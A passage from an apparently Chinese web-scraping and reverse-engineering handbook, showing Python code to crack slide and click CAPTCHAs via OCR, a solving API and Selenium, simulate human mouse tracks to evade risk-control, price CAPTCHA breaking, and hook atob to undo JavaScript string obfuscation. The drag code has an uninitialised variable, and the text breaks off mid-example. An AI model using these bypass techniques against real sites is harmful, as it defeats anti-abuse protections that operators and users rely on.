            <span class="s1">&#39;typeid&#39;</span><span class="p">:</span> <span class="s1">&#39;33&#39;</span><span class="p">,</span>  <span class="c1"># æ»‘å—éªŒè¯ç ç±»å‹</span>
            <span class="s1">&#39;image&#39;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">bg_img</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span>
            <span class="s1">&#39;slide&#39;</span><span class="p">:</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">slide_img</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
        <span class="p">}</span>

        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">api_url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

        <span class="k">return</span> <span class="n">result</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;result&#39;</span><span class="p">]</span>  <span class="c1"># è¿”å›ç¼ºå£è·ç¦»</span>
</code></pre>
      </div>

      <h4 id="84-ç‚¹é€‰éªŒè¯ç ">8.4 ç‚¹é€‰éªŒè¯ç </h4>

      <p><strong>åŸç†</strong>: ç”¨æˆ·éœ€è¦æŒ‰é¡ºåºç‚¹å‡»æŒ‡å®šçš„æ–‡å­—æˆ–å›¾ç‰‡ã€‚</p>

      <p><strong>ç ´è§£æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">paddleocr</span><span class="w"> </span><span class="kn">import</span> <span class="n">PaddleOCR</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ClickCaptchaCracker</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">ocr</span> <span class="o">=</span> <span class="n">PaddleOCR</span><span class="p">(</span><span class="n">use_angle_cls</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">lang</span><span class="o">=</span><span class="s1">&#39;ch&#39;</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">recognize_text</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">image_path</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è¯†åˆ«å›¾ç‰‡ä¸­çš„æ–‡å­—ä½ç½®&quot;&quot;&quot;</span>
        <span class="n">result</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ocr</span><span class="o">.</span><span class="n">ocr</span><span class="p">(</span><span class="n">image_path</span><span class="p">,</span> <span class="bp">cls</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

        <span class="n">text_positions</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">word_info</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
                <span class="n">box</span> <span class="o">=</span> <span class="n">word_info</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>  <span class="c1"># åæ ‡</span>
                <span class="n">text</span> <span class="o">=</span> <span class="n">word_info</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>  <span class="c1"># æ–‡å­—</span>
                <span class="n">confidence</span> <span class="o">=</span> <span class="n">word_info</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>  <span class="c1"># ç½®ä¿¡åº¦</span>

                <span class="c1"># è®¡ç®—ä¸­å¿ƒç‚¹</span>
                <span class="n">center_x</span> <span class="o">=</span> <span class="p">(</span><span class="n">box</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">0</span><span class="p">])</span> <span class="o">/</span> <span class="mi">2</span>
                <span class="n">center_y</span> <span class="o">=</span> <span class="p">(</span><span class="n">box</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">box</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="mi">1</span><span class="p">])</span> <span class="o">/</span> <span class="mi">2</span>

                <span class="n">text_positions</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                    <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="n">text</span><span class="p">,</span>
                    <span class="s1">&#39;x&#39;</span><span class="p">:</span> <span class="n">center_x</span><span class="p">,</span>
                    <span class="s1">&#39;y&#39;</span><span class="p">:</span> <span class="n">center_y</span><span class="p">,</span>
                    <span class="s1">&#39;confidence&#39;</span><span class="p">:</span> <span class="n">confidence</span>
                <span class="p">})</span>

        <span class="k">return</span> <span class="n">text_positions</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">click_sequence</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">driver</span><span class="p">,</span> <span class="n">target_texts</span><span class="p">,</span> <span class="n">positions</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æŒ‰é¡ºåºç‚¹å‡»æŒ‡å®šæ–‡å­—&quot;&quot;&quot;</span>
        <span class="k">for</span> <span class="n">target_text</span> <span class="ow">in</span> <span class="n">target_texts</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="n">positions</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">pos</span><span class="p">[</span><span class="s1">&#39;text&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="n">target_text</span><span class="p">:</span>
                    <span class="c1"># ç‚¹å‡»è¯¥ä½ç½®</span>
                    <span class="n">element</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="s1">&#39;captcha-image&#39;</span><span class="p">)</span>
                    <span class="n">ActionChains</span><span class="p">(</span><span class="n">driver</span><span class="p">)</span><span class="o">.</span><span class="n">move_to_element_with_offset</span><span class="p">(</span>
                        <span class="n">element</span><span class="p">,</span>
                        <span class="n">pos</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">],</span>
                        <span class="n">pos</span><span class="p">[</span><span class="s1">&#39;y&#39;</span><span class="p">]</span>
                    <span class="p">)</span><span class="o">.</span><span class="n">click</span><span class="p">()</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
                    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
                    <span class="k">break</span>
</code></pre>
      </div>

      <h4 id="85-è¡Œä¸ºéªŒè¯ç ">8.5 è¡Œä¸ºéªŒè¯ç </h4>

      <p><strong>æ£€æµ‹ç»´åº¦</strong>:</p>

      <ol>
        <li><strong>é¼ æ ‡è½¨è¿¹</strong>: æ›²çº¿æ˜¯å¦å¹³æ»‘ã€æ˜¯å¦ç¬¦åˆè´å¡å°”æ›²çº¿</li>
        <li><strong>é€Ÿåº¦å˜åŒ–</strong>: æ˜¯å¦æœ‰åŠ é€Ÿåº¦å˜åŒ–</li>
        <li><strong>ç‚¹å‡»æ—¶æœº</strong>: ä½•æ—¶å¼€å§‹æ‹–åŠ¨ã€ä½•æ—¶é‡Šæ”¾</li>
        <li><strong>è®¾å¤‡æŒ‡çº¹</strong>: Canvasã€WebGLã€å­—ä½“åˆ—è¡¨ç­‰</li>
        <li><strong>ç¯å¢ƒä¿¡æ¯</strong>: IPã€User-Agentã€æµè§ˆå™¨ç‰ˆæœ¬</li>
        <li><strong>å†å²è¡Œä¸º</strong>: è¯¥ç”¨æˆ·/IP çš„å†å²éªŒè¯è®°å½•</li>
      </ol>

      <p><strong>å¯¹æŠ—ç­–ç•¥</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="k">class</span><span class="w"> </span><span class="nc">HumanBehaviorSimulator</span><span class="p">:</span>
    <span class="nd">@staticmethod</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">bezier_curve</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">end</span><span class="p">,</span> <span class="n">control_points</span><span class="p">,</span> <span class="n">steps</span><span class="o">=</span><span class="mi">100</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ç”Ÿæˆè´å¡å°”æ›²çº¿è½¨è¿¹&quot;&quot;&quot;</span>
        <span class="n">points</span> <span class="o">=</span> <span class="p">[</span><span class="n">start</span><span class="p">]</span> <span class="o">+</span> <span class="n">control_points</span> <span class="o">+</span> <span class="p">[</span><span class="n">end</span><span class="p">]</span>
        <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">points</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
        <span class="n">curve</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">np</span><span class="o">.</span><span class="n">linspace</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">steps</span><span class="p">):</span>
            <span class="n">point</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">]</span>
            <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">points</span><span class="p">):</span>
                <span class="n">binomial</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">math</span><span class="o">.</span><span class="n">comb</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1</span> <span class="o">-</span> <span class="n">t</span><span class="p">)</span><span class="o">**</span><span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="n">t</span><span class="o">**</span><span class="n">i</span>
                <span class="n">point</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+=</span> <span class="n">binomial</span> <span class="o">*</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
                <span class="n">point</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+=</span> <span class="n">binomial</span> <span class="o">*</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
            <span class="n">curve</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">point</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">curve</span>

    <span class="nd">@staticmethod</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">add_random_jitter</span><span class="p">(</span><span class="n">track</span><span class="p">,</span> <span class="n">max_jitter</span><span class="o">=</span><span class="mi">2</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ·»åŠ éšæœºæŠ–åŠ¨&quot;&quot;&quot;</span>
        <span class="n">jittered_track</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">point</span> <span class="ow">in</span> <span class="n">track</span><span class="p">:</span>
            <span class="n">jittered_track</span><span class="o">.</span><span class="n">append</span><span class="p">([</span>
                <span class="n">point</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">-</span><span class="n">max_jitter</span><span class="p">,</span> <span class="n">max_jitter</span><span class="p">),</span>
                <span class="n">point</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">-</span><span class="n">max_jitter</span><span class="p">,</span> <span class="n">max_jitter</span><span class="p">)</span>
            <span class="p">])</span>
        <span class="k">return</span> <span class="n">jittered_track</span>

    <span class="nd">@staticmethod</span>
    <span class="k">def</span><span class="w"> </span><span class="nf">simulate_drag</span><span class="p">(</span><span class="n">driver</span><span class="p">,</span> <span class="n">element</span><span class="p">,</span> <span class="n">distance</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¨¡æ‹Ÿäººç±»æ‹–åŠ¨è¡Œä¸º&quot;&quot;&quot;</span>
        <span class="c1"># 1. ç”Ÿæˆæ§åˆ¶ç‚¹</span>
        <span class="n">control_points</span> <span class="o">=</span> <span class="p">[</span>
            <span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="n">distance</span> <span class="o">*</span> <span class="mf">0.3</span><span class="p">,</span> <span class="n">distance</span> <span class="o">*</span> <span class="mf">0.4</span><span class="p">),</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">-</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">)],</span>
            <span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="n">distance</span> <span class="o">*</span> <span class="mf">0.6</span><span class="p">,</span> <span class="n">distance</span> <span class="o">*</span> <span class="mf">0.7</span><span class="p">),</span> <span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="o">-</span><span class="mi">5</span><span class="p">,</span> <span class="mi">5</span><span class="p">)]</span>
        <span class="p">]</span>

        <span class="c1"># 2. ç”Ÿæˆæ›²çº¿</span>
        <span class="n">curve</span> <span class="o">=</span> <span class="n">HumanBehaviorSimulator</span><span class="o">.</span><span class="n">bezier_curve</span><span class="p">(</span>
            <span class="p">[</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="p">[</span><span class="n">distance</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span> <span class="n">control_points</span>
        <span class="p">)</span>

        <span class="c1"># 3. æ·»åŠ æŠ–åŠ¨</span>
        <span class="n">curve</span> <span class="o">=</span> <span class="n">HumanBehaviorSimulator</span><span class="o">.</span><span class="n">add_random_jitter</span><span class="p">(</span><span class="n">curve</span><span class="p">)</span>

        <span class="c1"># 4. æ‰§è¡Œæ‹–åŠ¨</span>
        <span class="n">ActionChains</span><span class="p">(</span><span class="n">driver</span><span class="p">)</span><span class="o">.</span><span class="n">click_and_hold</span><span class="p">(</span><span class="n">element</span><span class="p">)</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>

        <span class="k">for</span> <span class="n">point</span> <span class="ow">in</span> <span class="n">curve</span><span class="p">:</span>
            <span class="n">ActionChains</span><span class="p">(</span><span class="n">driver</span><span class="p">)</span><span class="o">.</span><span class="n">move_by_offset</span><span class="p">(</span>
                <span class="n">point</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">-</span> <span class="n">last_x</span><span class="p">,</span>
                <span class="n">point</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">last_y</span>
            <span class="p">)</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.001</span><span class="p">,</span> <span class="mf">0.003</span><span class="p">))</span>
            <span class="n">last_x</span><span class="p">,</span> <span class="n">last_y</span> <span class="o">=</span> <span class="n">point</span>

        <span class="c1"># 5. é‡Šæ”¾å‰çš„åœé¡¿</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.1</span><span class="p">,</span> <span class="mf">0.3</span><span class="p">))</span>
        <span class="n">ActionChains</span><span class="p">(</span><span class="n">driver</span><span class="p">)</span><span class="o">.</span><span class="n">release</span><span class="p">()</span><span class="o">.</span><span class="n">perform</span><span class="p">()</span>
</code></pre>
      </div>

      <h4 id="86-æˆæœ¬åˆ†æ">8.6 æˆæœ¬åˆ†æ</h4>

      <table>
        <thead>
          <tr>
            <th>éªŒè¯ç ç±»å‹</th>
            <th>ç ´è§£æˆæœ¬ï¼ˆ2025ï¼‰</th>
            <th>æˆåŠŸç‡</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>æ™®é€šå›¾å½¢éªŒè¯ç </td>
            <td>Â¥0.001-0.005/æ¬¡</td>
            <td>95%+</td>
            <td>OCR è¯†åˆ«</td>
          </tr>
          <tr>
            <td>æ»‘å—éªŒè¯ç ï¼ˆæ— é£æ§ï¼‰</td>
            <td>Â¥0.01-0.05/æ¬¡</td>
            <td>80-90%</td>
            <td>å›¾åƒè¯†åˆ« + è½¨è¿¹æ¨¡æ‹Ÿ</td>
          </tr>
          <tr>
            <td>æéªŒ/æ˜“ç›¾ï¼ˆå¸¦é£æ§ï¼‰</td>
            <td>Â¥1-5/æ¬¡</td>
            <td>60-80%</td>
            <td>æ·±åº¦å­¦ä¹  + è¡Œä¸ºæ¨¡æ‹Ÿ</td>
          </tr>
          <tr>
            <td>æ™ºèƒ½éªŒè¯ç </td>
            <td>Â¥5-20/æ¬¡</td>
            <td>40-60%</td>
            <td>éœ€è¦å¤§é‡è®¾å¤‡æŒ‡çº¹ä¼ªé€ </td>
          </tr>
        </tbody>
      </table>

      <p><strong>å¯¹æ¯”</strong>: æ™ºèƒ½å¸¦é£æ§çš„éªŒè¯ç ç ´è§£æˆæœ¬æ˜¯æ™®é€šéªŒè¯ç çš„ <strong>100-1000 å€</strong>ã€‚</p>

      <p><strong>å‚è€ƒèµ„æº</strong>:</p>

      <ul>
        <li><a href="https://blog.csdn.net/qq_44866828/article/details/148482799">2025æœ€æ–°æ»‘å—éªŒè¯ç ã€å›¾å½¢éªŒè¯ç è§£å†³æ–¹æ¡ˆ</a></li>
        <li><a href="https://www.aneasystone.com/archives/2018/03/python-selenium-geetest-crack.html">ä½¿ç”¨ Python +
            Selenium ç ´è§£æ»‘å—éªŒè¯ç </a></li>
        <li><a href="https://www.aqniu.com/tools-tech/29545.html">éªŒè¯ç å“ªå®¶å¼ºï¼Ÿå…­å¤§éªŒè¯å¹³å°è¯„æµ‹</a></li>
        <li><a href="https://www.cnblogs.com/worktile/articles/18958534">æ»‘å—éªŒè¯ç èƒ½è¢«æœºå™¨ç ´è§£å—</a></li>
      </ul>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-browser-fingerprinting">æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="#04-Advanced-Recipes-tls-fingerprinting">TLS æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="#04-Advanced-Recipes-canvas-fingerprinting">Canvas æŒ‡çº¹æŠ€æœ¯</a></li>
        <li><a href="#06-Engineering-proxy-pool-management">ä»£ç†æ± ç®¡ç†</a></li>
        <li><a href="#07-Scripts-javascript-hook-scripts">JavaScript Hook æŠ€æœ¯</a></li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-frontend-hardening">
      <h2>38. Frontend Hardening</h2>
      <h1 id="å‰ç«¯åŠ å›ºæŠ€æœ¯è¯¦è§£">å‰ç«¯åŠ å›ºæŠ€æœ¯è¯¦è§£</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>å‰ç«¯åŠ å›ºæ˜¯ä¿æŠ¤ Web åº”ç”¨ä»£ç å’Œé€»è¾‘ä¸è¢«è½»æ˜“åˆ†æçš„æŠ€æœ¯é›†åˆã€‚éšç€å‰ç«¯åº”ç”¨å¤æ‚åº¦å¢åŠ ï¼Œè¶Šæ¥è¶Šå¤šçš„ä¸šåŠ¡é€»è¾‘ç§»è‡³å‰ç«¯ï¼Œä»£ç ä¿æŠ¤å˜å¾—å°¤ä¸ºé‡è¦ã€‚æœ¬ç« ä»‹ç»ä¸»æµçš„å‰ç«¯åŠ å›ºæ‰‹æ®µã€å®ç°åŸç†åŠé€†å‘åˆ†ææ–¹æ³•ã€‚</p>

      <hr />

      <h2 id="ä»£ç æ··æ·†-code-obfuscation">ä»£ç æ··æ·† (Code Obfuscation)</h2>

      <h3 id="1-å˜é‡åæ··æ·†-identifier-mangling">1. å˜é‡åæ··æ·† (Identifier Mangling)</h3>

      <p><strong>åŸç†</strong>: å°†æœ‰æ„ä¹‰çš„å˜é‡åã€å‡½æ•°åæ›¿æ¢ä¸ºæ— æ„ä¹‰çš„çŸ­å­—ç¬¦ã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŸå§‹ä»£ç </span>
<span class="kd">function</span><span class="w"> </span><span class="nx">calculateUserAge</span><span class="p">(</span><span class="nx">birthYear</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">currentYear</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">().</span><span class="nx">getFullYear</span><span class="p">();</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">currentYear</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">birthYear</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// æ··æ·†å</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">_0x3a2b</span><span class="p">(</span><span class="nx">_0x1c4d</span><span class="p">,</span><span class="w"> </span><span class="nx">_0x5e6f</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">_0x7a8b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">().</span><span class="nx">getFullYear</span><span class="p">();</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">_0x7a8b</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">_0x1c4d</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>å·¥å…·</strong>:</p>

      <ul>
        <li>JavaScript Obfuscator</li>
        <li>Terser (å‹ç¼©å™¨ï¼Œéƒ¨åˆ†æ··æ·†)</li>
        <li>Closure Compiler</li>
      </ul>

      <p><strong>ç ´è§£æ–¹æ³•</strong>:</p>

      <ul>
        <li>é‡å‘½åä¸ºæœ‰æ„ä¹‰çš„åç§°</li>
        <li>ä½¿ç”¨ IDE çš„é‡æ„åŠŸèƒ½</li>
        <li>é€šè¿‡ä¸Šä¸‹æ–‡æ¨æ–­å˜é‡ç”¨é€”</li>
      </ul>

      <h3 id="2-å­—ç¬¦ä¸²åŠ å¯†-string-encryption">2. å­—ç¬¦ä¸²åŠ å¯† (String Encryption)</h3>

      <p><strong>åŸç†</strong>: å°†å­—ç¬¦ä¸²åŠ å¯†å­˜å‚¨ï¼Œè¿è¡Œæ—¶è§£å¯†ä½¿ç”¨ã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŸå§‹ä»£ç </span>
<span class="kd">const</span><span class="w"> </span><span class="nx">apiUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;https://api.example.com/users&quot;</span><span class="p">;</span>
<span class="nx">fetch</span><span class="p">(</span><span class="nx">apiUrl</span><span class="p">);</span>

<span class="c1">// æ··æ·†å</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">_0x4a2c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;aHR0cHM6Ly9hcGkuZXhhbXBsZS5jb20vdXNlcnM=&#39;</span><span class="p">];</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">_0x1b3d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x2c4e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">atob</span><span class="p">(</span><span class="nx">_0x2c4e</span><span class="p">);</span>
<span class="p">};</span>
<span class="nx">fetch</span><span class="p">(</span><span class="nx">_0x1b3d</span><span class="p">(</span><span class="nx">_0x4a2c</span><span class="p">[</span><span class="mf">0</span><span class="p">]));</span>
</code></pre>
      </div>

      <p><strong>å¸¸è§ç¼–ç æ–¹å¼</strong>:</p>

      <ul>
        <li>Base64</li>
        <li>è‡ªå®šä¹‰ç¼–ç è¡¨</li>
        <li>XOR åŠ å¯†</li>
        <li>RC4 æµå¯†ç </li>
      </ul>

      <p><strong>ç ´è§£æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook è§£å¯†å‡½æ•°</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">original_atob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">atob</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">atob</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">str</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">original_atob</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Decoded:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">str</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;-&gt;&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">};</span>

<span class="c1">// æˆ–è€…ç›´æ¥è°ƒç”¨è§£å¯†å‡½æ•°</span>
<span class="nx">_0x1b3d</span><span class="p">(</span><span class="nx">_0x4a2c</span><span class="p">[</span><span class="mf">0</span><span class="p">]);</span><span class="w"> </span><span class="c1">// æŸ¥çœ‹ç»“æœ</span>
</code></pre>
      </div>

      <h3 id="3-æ§åˆ¶æµå¹³å¦åŒ–-control-flow-flattening">3. æ§åˆ¶æµå¹³å¦åŒ– (Control Flow Flattening)</h3>

      <p><strong>åŸç†</strong>: æ‰“ä¹±ä»£ç æ‰§è¡Œé¡ºåºï¼Œä½¿ç”¨ switch-case æˆ–çŠ¶æ€æœºç»“æ„ã€‚</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŸå§‹ä»£ç </span>
<span class="kd">function</span><span class="w"> </span><span class="nx">process</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">validate</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">transform</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
<span class="w">    </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// å¹³å¦åŒ–å</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">process</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">_0x1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">_0x1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mf">0</span><span class="o">:</span>
<span class="w">                </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">validate</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
<span class="w">                </span><span class="nx">_0x1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
<span class="w">                </span><span class="k">break</span><span class="p">;</span>
<span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="mf">2</span><span class="o">:</span>
